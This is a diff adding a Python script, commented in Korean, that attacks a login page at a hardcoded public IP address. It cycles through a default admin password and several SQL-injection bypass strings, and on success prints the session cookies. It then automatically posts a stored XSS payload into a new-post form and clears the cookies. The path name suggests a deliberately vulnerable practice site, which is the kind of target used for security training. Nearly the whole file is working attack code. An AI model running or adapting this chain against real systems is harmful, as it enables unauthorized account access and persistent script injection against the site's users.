@@ -1,0 +1,160 @@
+import requests
+from bs4 import BeautifulSoup
+from urllib.error import URLError
+from urllib.parse import urljoin
+import time
+
+class AutoLoginScanner:
+    def __init__(self, url, username_field='username', password_field='password'):
+        self.url = url
+        self.username_field = username_field
+        self.password_field = password_field
+        self.session = requests.Session()
+
+    def login(self, username, password, extra_fields=None, headers=None, timeout=10):
+        # 1) 로그인 페이지 GET
+        try:
+            r = self.session.get(self.url, headers=headers, timeout=timeout)
+        except requests.RequestException as e:
+            raise URLError(f"[GET 실패] {e}")
+
+        # 2) payload 기본 구성
+        payload = {
+            self.username_field: username,
+            self.password_field: password
+        }
+        # 3) hidden input 자동 병합 (CSRF 토큰 등)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        for hidden in soup.find_all('input', {'type':'hidden'}):
+            name = hidden.get('name')
+            val  = hidden.get('value','')
+            if name and name not in payload:
+                payload[name] = val
+
+        # 4) 추가 필드 병합
+        if extra_fields:
+            payload.update(extra_fields)
+
+        # 5) 로그인 POST
+        try:
+            resp = self.session.post(self.url,
+                                     data=payload,
+                                     headers=headers,
+                                     timeout=timeout,
+                                     allow_redirects=True)
+        except requests.RequestException as e:
+            raise URLError(f"[POST 실패] {e}")
+
+        # 6) 성공 판단
+        success = False
+        if resp.history and resp.status_code == 200:
+            success = True
+        if "로그인 실패" in resp.text or "Invalid credentials" in resp.text:
+            success = False
+        if "logout" in resp.text.lower() or "sign out" in resp.text.lower():
+            success = True
+
+        return resp, success
+
+# — 여기에 아래 함수들을 추가 —
+
+def auto_post_xss(scanner, xss_payload):
+    """
+    로그인된 세션으로 new_post.php에 접속 → form 파싱 → XSS 페이로드 담아 POST →
+    결과 출력
+    """
+    # 1) new_post.php URL 구성 (login URL 기준으로 도메인/포트만 따옴)
+    base = scanner.url.split("/")[0] + "//" + scanner.url.split("/")[2]
+    new_post_url = base + "/vulnerable-sns/www/new_post.php"
+
+    # 2) GET new_post.php
+    r = scanner.session.get(new_post_url, timeout=5)
+    if r.status_code != 200:
+        print("▶ new_post.php 불러오기 실패:", r.status_code)
+        return False
+
+    # 3) form action 과 hidden input 파싱
+    soup = BeautifulSoup(r.text, 'html.parser')
+    form = soup.find('form')
+    if form and form.has_attr('action'):
+        post_url = urljoin(new_post_url, form['action'])
+    else:
+        post_url = new_post_url
+
+    data = {}
+    # hidden field 전부 수집
+    for hidden in soup.find_all('input', {'type':'hidden'}):
+        if hidden.has_attr('name'):
+            data[hidden['name']] = hidden.get('value','')
+
+    # 4) content 필드에 XSS 페이로드 삽입
+    data['content'] = xss_payload
+
+    # 5) POST
+    post_resp = scanner.session.post(post_url, data=data, allow_redirects=False, timeout=5)
+    if post_resp.status_code in (200,201,302):
+        print("✅ 자동 XSS 게시글 작성 성공! (POST → {})".format(post_url))
+        return True
+    else:
+        print("❌ 자동 XSS 게시글 작성 실패: status_code=", post_resp.status_code)
+        return False
+
+def clear_cookies_and_logout(scanner):
+    """
+    단순히 세션 쿠키를 지워서 로그아웃 효과를 냅니다.
+    """
+    scanner.session.cookies.clear()
+    print("▶ 세션 쿠키 전부 삭제 (로그아웃 처리)")
+
+# — brute_force_login 내부 수정 —
+PAYLOADS = [
+    # (username, password, 설명)
+    ("admin", "1234", "관리자 기본 비번"),
+    ("admin' OR '1'='1'--", "any", "Classic OR 1=1"),
+    ("admin'--",            "any", "Comment Bypass"),
+    ("' OR 1=1--",          "any", "Empty Username"),
+    ("admin",               "' OR '1'='1", "Password Field"),
+]
+
+def brute_force_login(scanner, headers=None, delay=0.5):
+    total = len(PAYLOADS)
+    for idx, (user, pw, desc) in enumerate(PAYLOADS, 1):
+        print(f"[{idx}/{total}] 시도: {desc}")
+        try:
+            resp, ok = scanner.login(username=user, password=pw, headers=headers)
+        except URLError as e:
+            print("  ▶ 오류 발생:", e)
+            continue
+
+        if ok:
+            print(f"  ▶ 로그인 성공! ({user}/{pw})")
+            print("    세션 쿠키:", scanner.session.cookies.get_dict())
+
+            # —— 여기에 자동 XSS 포스트 & 로그아웃 호출 ——
+            payload = '<img src=x onerror="alert(대머리빡빡이)">'
+            auto_post_xss(scanner, payload)      # new_post.php에 XSS 자동 업로드
+            clear_cookies_and_logout(scanner)    # 쿠키 전부 삭제 → 로그아웃 효과
+
+            return True
+
+        else:
+            print("  ▶ 로그인 실패")
+        time.sleep(delay)
+
+    print("모든 페이로드 시도 완료: 실패")
+    return False
+
+# ======================================================
+if __name__ == "__main__":
+    LOGIN_URL       = "http://18.179.53.107/vulnerable-sns/www/login.php"
+    USER_FIELD_NAME = "username"
+    PASS_FIELD_NAME = "password"
+    HEADERS = {"User-Agent": "Mozilla/5.0"}
+
+    scanner = AutoLoginScanner(
+        url=LOGIN_URL,
+        username_field=USER_FIELD_NAME,
+        password_field=PASS_FIELD_NAME
+    )
+
+    brute_force_login(scanner, headers=HEADERS, delay=0.3)
